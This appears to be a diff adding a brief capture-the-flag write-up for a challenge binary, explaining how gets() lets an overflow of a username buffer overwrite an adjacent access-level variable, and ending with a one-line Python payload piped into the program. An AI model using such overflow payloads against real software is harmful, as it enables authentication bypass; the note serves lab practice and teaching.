@@ -1,0 +1,21 @@
+problem located here:
+/problems/983b223e2939da4db7ab39b5bec62798/vrgearconsole
+
+buffer overflow exploit.
+
+	int accesslevel = 0xff
+	char username
+	char password
+
+all adjacent on stack. 
+
+vuln: gets(username), gets(password)
+
+gets() does not check for size, so we can overflow username into
+accesslevel. challenge tests for auth if accesslevel between 0x00 and
+0x30 exclusive. 
+
+remember! we need to keep stdin open.
+
+payload:
+(python -c 'print "A"*16 + "#"; print "asdf"'; cat -) | ./vrgearconsole
